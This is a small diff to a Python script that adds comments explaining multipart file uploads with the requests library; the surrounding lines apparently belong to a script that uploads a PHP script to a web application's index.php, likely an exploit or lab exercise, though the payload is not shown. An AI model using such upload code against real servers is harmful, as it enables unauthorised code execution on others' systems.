@@ -97,6 +97,8 @@ data = {
 files = {
     "uploadedfile" : bytearray(php_script, 'utf-8')
 }
+# to upload files as multipart/form-data, data param can contain the metadata, such as the filename
+# while files can contain the actual byte file
 # reference: https://stackoverflow.com/questions/22567306/python-requests-file-upload
 # reference: https://stackoverflow.com/questions/24555949/difference-between-data-and-files-in-python-requests
 response = session.post(URL + 'index.php', files=files, data=data)
